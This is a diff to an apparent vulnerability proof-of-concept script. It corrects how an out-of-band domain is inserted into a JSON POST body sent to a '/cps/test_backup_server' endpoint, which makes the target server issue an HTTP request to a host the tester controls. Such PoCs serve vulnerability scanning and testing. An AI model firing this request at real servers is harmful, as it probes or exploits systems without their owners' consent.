@@ -41,7 +41,7 @@ def poc(url):
 
         path = """/cps/test_backup_server?ACTION=TEST_IP&NOCONTINUE=TRUE"""
         method = "POST"
-        data = """{"test_type":"ip","test_debug":false,"ipnotify_type":"http/get","ipnotify_address":"http://oob_domain","ipnotify_username":"","ipnotify_password":"","ipnotify_port":"0","ipnotify_content_type":"","ipnotify_template":""}"""
+        data = """{"test_type":"ip","test_debug":false,"ipnotify_type":"http/get","ipnotify_address":"http://{oob_domain}","ipnotify_username":"","ipnotify_password":"","ipnotify_port":"0","ipnotify_content_type":"","ipnotify_template":""}""".format(oob_domain=oob_domain)
         headers = {'content-type': 'application/json', 'Accept': '*/*'}
         resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
